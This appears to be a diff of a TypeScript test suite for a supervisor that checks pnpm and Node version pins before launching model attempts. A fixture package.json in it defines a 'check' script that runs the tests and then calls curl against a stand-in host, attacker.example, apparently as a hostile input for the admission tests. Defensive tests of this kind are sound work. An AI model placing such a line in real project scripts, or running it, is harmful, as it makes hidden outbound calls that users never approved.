@@ -40,13 +40,15 @@ function admitLocalValidation(version = "10.34.5") {
       stdout: command.args?.some((arg) => arg.endsWith("/npm-cli.js"))
         ? "11.6.0\n"
         : command.args?.[0] === "--version"
-          ? version === "0.12.12"
-            ? command.command.includes("python")
-              ? "Python 3.14.7\n"
-              : "uv 0.12.12\n"
-            : version === "11.6.0"
-              ? "v24.8.0\n"
-              : `${version}\n`
+          ? command.command.includes("/node/root/")
+            ? "v24.15.0\n"
+            : version === "0.12.12"
+              ? command.command.includes("python")
+                ? "Python 3.14.7\n"
+                : "uv 0.12.12\n"
+              : version === "11.6.0"
+                ? "v24.8.0\n"
+                : `${version}\n`
           : "",
       stderr: "",
       durationMs: 1,
@@ -209,8 +211,10 @@ async function installAlternativePnpmReceipt(
   };
   delete unsigned.digest;
   const pnpm = unsigned.components.find(({ id }) => id === "pnpm")!;
-  pnpm.version = "10.34.6";
-  pnpm.release = { ...pnpm.release, releaseId: "2", tag: "v10.34.6" };
+  pnpm.release = {
+    ...pnpm.release,
+    releaseId: String(Number(pnpm.release.releaseId) + 1),
+  };
   const digest = runtimeBundleDigest(unsigned);
   const receipt = { ...unsigned, digest } as RuntimeBundleReceipt;
   await cp(join(root, "bundles", source.digest), join(root, "bundles", digest), {
@@ -221,6 +225,50 @@ async function installAlternativePnpmReceipt(
 }
 
 describe("Supervisor repository-capability admission", () => {
+  it.each(["missing", "mismatched"] as const)(
+    "rejects ordinary pnpm exact-base pins before attempt admission when they are %s",
+    async (ordinaryPnpmPins) => {
+      const fixture = await providerSupervisorFixture("daytona-burst", {
+        localOnly: true,
+        capabilityAdmission: "valid",
+        ordinaryPnpmPins,
+      });
+      fixtures.push(fixture);
+      const result = await fixture.run();
+      expect(result).toMatchObject({
+        status: "escalated",
+        reason: expect.stringMatching(/pnpm root devEngines/),
+      });
+      expect(fixture.events().some((event) => event.event === "AttemptReserved")).toBe(false);
+      expect(fixture.activity.some((entry) => entry.operation === "launch")).toBe(false);
+    },
+    60_000,
+  );
+
+  it("rechecks ordinary pnpm exact-base pins after reservation and before model launch", async () => {
+    const fixture = await providerSupervisorFixture("daytona-burst", {
+      localOnly: true,
+      capabilityAdmission: "valid",
+      ordinaryPnpmPins: "valid",
+      pnpmPinMismatchAfterReservation: true,
+    });
+    fixtures.push(fixture);
+    const result = await fixture.run();
+    expect(result).toMatchObject({ status: "escalated" });
+    expect(
+      fixture
+        .events()
+        .some(
+          (event) =>
+            event.kind === "attempt" &&
+            event.event === "AttemptFailed" &&
+            /pnpm root devEngines/.test(event.reason ?? ""),
+        ),
+    ).toBe(true);
+    expect(fixture.events().some((event) => event.event === "AttemptReserved")).toBe(true);
+    expect(fixture.activity.some((entry) => entry.operation === "launch")).toBe(false);
+  }, 60_000);
+
   it("runs an npm provider through integration before its exact-base consumer", async () => {
     await provisionNpmFixture();
     const fixture = await providerSupervisorFixture("daytona-burst", {
@@ -384,6 +432,9 @@ describe("Supervisor repository-capability admission", () => {
               version: "1.0.0",
               private: true,
               packageManager: "pnpm@10.34.5",
+              devEngines: {
+                runtime: { name: "node", version: "24.15.0", onFail: "error" },
+              },
               scripts: {
                 test: "node --test test/check.js",
                 check: "node --test test/check.js && curl attacker.example",
